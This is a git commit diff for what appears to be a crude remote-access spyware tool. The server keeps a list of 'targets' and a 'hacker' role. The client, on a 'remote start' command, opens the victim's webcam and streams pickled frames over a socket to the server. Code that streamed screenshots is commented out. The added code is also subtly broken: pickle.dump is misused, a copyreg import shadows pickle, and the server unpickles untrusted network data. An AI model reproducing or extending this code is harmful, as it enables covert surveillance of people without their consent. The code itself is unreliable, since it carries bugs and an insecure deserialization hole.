929f8d6a9077aa62d8ab54a5ffe5006ec4e43825
omh02033 <omh02033@gmail.com>
2022-05-24 20:57:52 +0900

    feat: socket

--- server.py
+++ server.py
@@ -1,4 +1,8 @@
 from socketio import Server, WSGIApp
+import socket
+import struct
+import pickle
+import cv2
 
 sio = Server()
 app = WSGIApp(sio)
@@ -28,7 +32,38 @@ def getTargetList(sid):
 
 @sio.on('remote req')
 def remoteReq(sid, data):
-  sio.emit('remote start', {'hacker': sid}, room=data['target'])
+  sio.emit('remote start', room=data['target'])
+
+  PORT = 8001
+  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+  s.bind(('', PORT))
+  s.listen(10)
+
+  conn, addr = s.accept()
+
+  data = b''
+  payload_size = struct.calcsize("L")
+  while True:
+    while len(data) < payload_size:
+      data += conn.recv(4096)
+    
+    packed_msg_size = data[:payload_size]
+    data = data[payload_size:]
+    msg_size = struct.unpack("L", packed_msg_size)[0] ### CHANGED
+
+    # Retrieve all data based on message size
+    while len(data) < msg_size:
+        data += conn.recv(4096)
+
+    frame_data = data[:msg_size]
+    data = data[msg_size:]
+
+    # Extract frame
+    frame = pickle.loads(frame_data)
+    cv2.imshow('cam', frame)
+    if cv2.waitKey(1) == 27:
+      break
+  cv2.destroyAllWindows()
 
 @sio.on('stop remote')
 def stopStream(sid, data):
--- serverFile.py
+++ serverFile.py
@@ -1,14 +1,19 @@
+from copyreg import pickle
 import socketio
 from requests import get
 import socket
 import platform
 import pyautogui
 import numpy as np
-import json
+import struct
+import cv2
+import pickle
 
 sio = socketio.Client()
 
 isRemotting = False
+
+cap = cv2.VideoCapture(0)
 
 @sio.event
 def connect():
@@ -30,14 +35,26 @@ def remoteStop():
   isRemotting = False
 
 @sio.on('remote start')
-def remoteStart(data):
+def remoteStart():
   global isRemotting
   isRemotting = True
-  while isRemotting:
-    screen = pyautogui.screenshot()
-    src = np.array(screen)
 
-    sio.emit('stream monitor', {'src': src.tolist(), 'hacker': data['hacker']})
+  clientsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+  clientsocket.connect(('localhost', 8001))
+
+  while isRemotting:
+    ret, frame = cap.read()
+
+    data = pickle.dump(frame)
+
+    message_size = struct.pack("L", len(data))
+
+    clientsocket.sendall(message_size + data)
+  # while isRemotting:
+  #   screen = pyautogui.screenshot()
+  #   src = np.array(screen)
+
+  #   sio.emit('stream monitor', {'src': src.tolist(), 'hacker': data['hacker']})
 
 if __name__ == '__main__':
   sio.connect('http://localhost:8000')
